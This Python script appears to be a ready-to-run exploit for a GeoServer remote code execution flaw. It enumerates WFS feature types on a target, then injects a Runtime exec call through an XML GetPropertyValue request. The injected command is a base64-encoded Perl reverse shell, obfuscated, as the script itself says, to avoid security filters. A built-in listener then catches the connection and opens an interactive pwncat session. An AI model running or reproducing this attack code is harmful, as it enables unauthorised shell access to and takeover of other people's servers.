import base64
import socket
import requests
import threading
import pwncat.manager
import rich_click as click
import xml.etree.ElementTree as ET


class GeoServerExploit:
    def __init__(
        self,
        url: str,
        remote_ip: str,
        remote_port: int,
        bind_host: str = None,
        bind_port: int = None,
        proxy: dict = None,
    ):
        """
        Initialize the GeoServerExploit class with necessary parameters for the exploit.
        If bind_host or bind_port are not provided, they default to remote_ip and remote_port respectively.
        """
        self.url = url
        self.remote_ip = remote_ip
        self.remote_port = remote_port
        self.bind_host = bind_host if bind_host is not None else remote_ip
        self.bind_port = bind_port if bind_port is not None else remote_port
        self.proxy = proxy
        self.payload_delivered = False

    def custom_print(self, message: str, header: str) -> None:
        header_colors = {"+": "green", "-": "red", "!": "yellow", "*": "blue"}
        header_color = header_colors.get(header, "white")
        formatted_message = click.style(
            f"[{header}] ", fg=header_color, bold=True
        ) + click.style(message, bold=True, fg="white")
        click.echo(formatted_message)

    def construct_command(self):
        """
        Constructs a base64 encoded reverse shell command to avoid security filters.
        """
        cmd = (
            f'perl -e \'use Socket;$i="{self.remote_ip}";$p={self.remote_port};'
            'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
            'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
            'exec("/bin/bash -i");};\''
        )
        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        bash_command = f"sh -c echo${{IFS}}{cmd_b64}|base64${{IFS}}-d|sh"
        return bash_command

    def fetch_feature_types(self):
        feature_types = []
        try:
            response = requests.get(
                f"{self.url}/geoserver/wfs?request=ListStoredQueries&service=wfs&version=2.0.0",
                proxies=self.proxy,
            )
            if response.status_code == 200:
                tree = ET.fromstring(response.content)
                namespaces = {"wfs": "http://www.opengis.net/wfs/2.0"}
                feature_types = [
                    elem.text
                    for elem in tree.findall(".//wfs:ReturnFeatureType", namespaces)
                ]
                self.custom_print(
                    f"Fetched {len(feature_types)} feature types successfully.", "+"
                )
                for feature in feature_types:
                    self.custom_print(feature, "+")
                self.custom_print(f"Attempting exploit with object types", "!")
            else:
                self.custom_print("Failed to fetch feature types from GeoServer.", "-")
        except Exception as e:
            self.custom_print(f"Error fetching feature types: {e}", "-")
        return feature_types

    def execute_exploit(self, object_type):
        command = self.construct_command()
        full_url = f"{self.url}/geoserver/wfs"
        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Connection": "close",
            "Content-Type": "application/xml",
        }
        payload = f"""
            <wfs:GetPropertyValue service='WFS' version='2.0.0'
            xmlns:topp='http://www.openplans.org/topp'
            xmlns:fes='http://www.opengis.net/fes/2.0'
            xmlns:wfs='http://www.opengis.net/wfs/2.0'>
            <wfs:Query typeNames='{object_type}'/>
            <wfs:valueReference>exec(java.lang.Runtime.getRuntime(), "{command}")</wfs:valueReference>
            </wfs:GetPropertyValue>
        """
        response = requests.post(
            full_url, headers=headers, data=payload, proxies=self.proxy, verify=False
        )
        if response.status_code == 400 and "NoApplicableCode" in response.text:
            self.custom_print("Exploit delivered successfully.", "+")
            self.payload_delivered = True
            return True
        return False

    def start_listener(self):
        with socket.create_server((self.bind_host, self.bind_port)) as listener:
            listener.settimeout(30)
            self.custom_print(f"Listening on {self.bind_host}:{self.bind_port}...", "*")
            try:
                client, addr = listener.accept()
                self.custom_print(f"Received connection from {addr[0]}:{addr[1]}", "+")
                with pwncat.manager.Manager() as manager:
                    manager.create_session(
                        platform="linux", protocol="socket", client=client
                    )
                    manager.interactive()
            except socket.timeout:
                self.custom_print(
                    "No reverse shell connection received within timeout.", "-"
                )

    def run(self):
        listener_thread = threading.Thread(target=self.start_listener)
        listener_thread.daemon = True
        listener_thread.start()

        feature_types = self.fetch_feature_types()
        for feature_type in feature_types:
            if self.payload_delivered:
                self.custom_print(
                    "Stopping further attempts since the payload was delivered successfully.",
                    "*",
                )
                listener_thread.join()
                break
            self.execute_exploit(feature_type)


@click.command()
@click.option("-u", "--url", required=True, help="Target URL")
@click.option("-ip", "--remote-ip", required=True, help="Your IP for reverse shell")
@click.option(
    "-port", "--remote-port", required=True, type=int, help="Port for reverse shell"
)
@click.option("-bind-host", help="Local bind host for the listener")
@click.option("-bind-port", type=int, help="Local bind port for the listener")
@click.option("--proxy", default=None, help="Proxy URL, e.g., http://localhost:8080")
def main(url, remote_ip, remote_port, bind_host, bind_port, proxy):
    proxy_dict = {"http": proxy, "https": proxy} if proxy else None
    exploit = GeoServerExploit(
        url, remote_ip, remote_port, bind_host, bind_port, proxy_dict
    )
    exploit.run()


if __name__ == "__main__":
    click.echo(
        """
       _____   _____   ___ __ ___ _ _     ____  __ _ _   __  _ 
      / __\ \ / / __|_|_  )  \_  ) | | __|__ / / /| | | /  \/ |
     | (__ \ V /| _|___/ / () / /|_  _|___|_ \/ _ \_  _| () | |
      \___| \_/ |___| /___\__/___| |_|   |___/\___/ |_| \__/|_|

      Exploit Developers: Chocapikk, K3ysTr0K3R
    """
    )
    main()
